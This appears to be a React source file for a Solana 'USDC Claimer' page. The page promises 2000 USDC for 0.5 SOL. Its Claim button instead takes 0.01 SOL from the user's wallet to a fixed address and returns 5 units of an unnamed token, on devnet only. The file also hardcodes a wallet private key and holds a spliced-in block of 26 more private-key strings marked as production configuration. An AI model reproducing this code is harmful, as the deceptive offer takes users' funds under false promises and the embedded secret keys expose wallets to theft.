/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "52Fhy6mg4zwamYsDHtpKqkbeJeyxN8eMy2fCKGouvVw8TwT8eBei6xKXTuKyUtdmSNkJxX88pPGRscMY2JA7fufw"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "5TGj2RGDM3LB8PBJ82buciKGsFmfFByeHdiNCjHTfPvWybiYusftE7e7nxxzHN233GEFMuz6Y7ALa9bG5FMcfA8o",
  "key1": "2rS172c9L5xZEUtc2AtUz5pZHMwSsA6wnm5va4N1GYiaY6LHZEvDerLUyLV2LgeX6GwZE1BD9YiogBWH32WafeWj",
  "key2": "uU5dQptBhCX1ipRCkNQiLm5zszPARUY16LUeMQRarGqMyneatcPv9uuFTUPavnQSWguxwkKzGuNPzDYpzH8HG9e",
  "key3": "4aFmk9bxE3DyVLuqK15ETmJmiNuYpJtoP9Xfx2QnrBRMR5CEWPnqoCyaJtX5aS2bg7cQG7WARExtJs2ZsC6tEbgr",
  "key4": "4DNRAkhvPbfAAnvxJASEMUvEqnm4RvZ5YtYKrpMvHbXCjLQvdFdhkf5HHa2mqHAuWKQWyYUJtfGBMyeDYPiU9MGw",
  "key5": "5Nq7hkHWpSK84L76t1AtR1otMS2pRWWqM5JdCFVbuTBHT2T9r1tp6a1yZHsW8tXKiV4UhnWdWXu3aQ3TvBeVm7DX",
  "key6": "4CRGUL4EZzuAJgkB3PAnuzPnsvY3By8ak91jQnrZcyxyKg7n4nqSLs9FZ3xBXhKFVAHMNehA3jG6rLjF8F8LYnVu",
  "key7": "2h2hYXQUWk6FL54W9sX6Jvb1CNHTwUnqDs6xkd9yS4kLWNmRdemGQQgqjA1yvoRzaJWAg1uMEPgHowatLwErKjby",
  "key8": "5qYLPimYfMBo6bW9eQEWq7gCQcRH7oCm3djTCXCxKhtWrzzd5vhmwGi5BXdqwkf6yH8wzydJ7z3QgnPfVnzmXzTC",
  "key9": "32ErExwUN888VTPXP5WZQftmimssNpyVmrUNHQZsf4ZHwqfpfgKHbGz4FKbBrGNGLcEKXzwjXXfpBZHTogkbJSyt",
  "key10": "4wCnFr9PMaJWSq1Ru8AvppvvdroT6h6uV2hvR6eA94FbjPuyyjWRHUugduPMJwRYhga5h749zsJvDNQgGY3Yhdnm",
  "key11": "2HTFrVVvKwqxdJbTqkZRz164x3tpQPtUsu9VEcqEB6RjMvspk1DE9JAHaHc1ptc9W2HgW9Qxr3a1ikwiNQhexTBk",
  "key12": "EPUWkTvALULwak59APxgWWsYLqKE77bZfjR1axt2QmxpZ2eezAqhjN8VHJqEZJ5th1mQWhwoqFp1rZ5K3FDQypR",
  "key13": "2kDjPj9R4dT5Wbv565Kac67viyo6xWZ5DjSapL7bdcBUNJwmnQgfLAEhMCyQbGtLh44JAi5sXpAJ845wdQcgoDHb",
  "key14": "4PAUy4sxZKSZ1PY2Lh2jEVzUj9ZgXvQtd1TJqSpojUQ6bJdy1PxGu9fnhYSSKp2RZstEc7pwnuTMX4aodwx4vjr6",
  "key15": "27xujTek1otDyPHEj1GkHWikAwBcNdsZiBL6L1G4zRQkj7hGF2nxemW2YLvmB1qz2aYEdRSdKgQXhZREjCsvwUPt",
  "key16": "apyHqQM4A4k9WqUsezho4L3qwNFpJbvFv8dSDdJRVydHDkRDi8D4JRFYmKWihw6V6si2ZdtR1N256y7yKK5hHBG",
  "key17": "53R1wDZsJz9dQ7Z1keToDQcjSMFYosLdujhVVumnt7cMFCwnoLFjRuczZ6ERZ45NL5DLhYivH2uxboJ7jerfAb5X",
  "key18": "2z7DHwVEthHJE7ox2BcrBqLtQ31CPDdv44Dd8viNP8L7WVaqPQMf2P9UFHvYZbSVNCpw6jKbbxiHsrtwoGcg4ofW",
  "key19": "3SA4MfERzi12dd8xPJFVaHZn11Dc2P6NuvZwzRVz8EBZvirTJMc1jyhHYUJgaFeDDE2gqkhNXCDHDihMm21DaLtG",
  "key20": "71DZU8nNtVcvtfduxUDGWcueXWnGWm2UHrjjr4JivZUiA4XMFgMjta3kSocqaZGNuJEQdQMsRqwUR5cCk2fgX5f",
  "key21": "5V4t8tLXoCC4sZeW8qiESH7DkuQVRKVay85wnuVpcTTtbJNm2arrYQSbawzAFNjbAWWHBb2XJAE1tPHFKZZBp3EE",
  "key22": "rEZ9CCEEuHfmu2bbJqgUcqhwqV1o21oigx1heb43PHtSbckei5uNYm1S9521EWpKcMZVX63uZasnyndPpuSfuxA",
  "key23": "2DdU3ZDT89o3pZooQVtsuwNBbQYbcBiVmhKhwu3g4BhA5votYvLxdbvqAyGHcQ9D2hi7y8hhqNYeLwQZdZKGrzdD",
  "key24": "54S18Avvu4KEKhCpxfwnLgscD8cAimBCX1dk2C6RdKasF5MvbVwmHStezLP2k9FY4m6CjVZ1M1Thn9f8ykC837u6",
  "key25": "58c4LxmbY1rgN5yXFVzbEEj7JVTEYFkvHPjPJrnsC7zimCqszvZkW7gdkKGgDxvX2BcsXX5Y4w1x7daoMLKHmJti"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
